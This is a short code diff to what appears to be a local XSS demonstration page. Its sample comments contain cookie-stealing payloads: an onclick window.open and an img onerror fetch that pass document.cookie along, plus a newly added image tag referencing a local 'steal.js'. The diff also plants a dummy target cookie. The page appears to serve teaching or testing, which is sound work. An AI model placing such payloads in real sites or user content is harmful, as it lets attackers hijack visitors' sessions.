@@ -27,9 +27,13 @@ export default {
         '只要你不尷尬，尷尬的就是別人',
         '很重要所以說三次！！',
         '不錯的文章<a href="#" onclick="window.open(`/#/cookie?cookie=${document.cookie}`, \'_blank\')">點我看更多</a>',
-        '測試圖片error<img src="xxx.com" onerror="fetch(`/#/cookie?cookie=${document.cookie}`)"/>'
+        '測試圖片error<img src="xxx.com" onerror="fetch(`/#/cookie?cookie=${document.cookie}`)"/>',
+        '讚一個吧<img src="http://127.0.0.1:5173/src/steal.js"></img>'
       ]
     }
+  },
+  created(){
+    document.cookie = 'targetCookie=1234; path="/"'
   },
   methods: {
     onInputSubmit () {
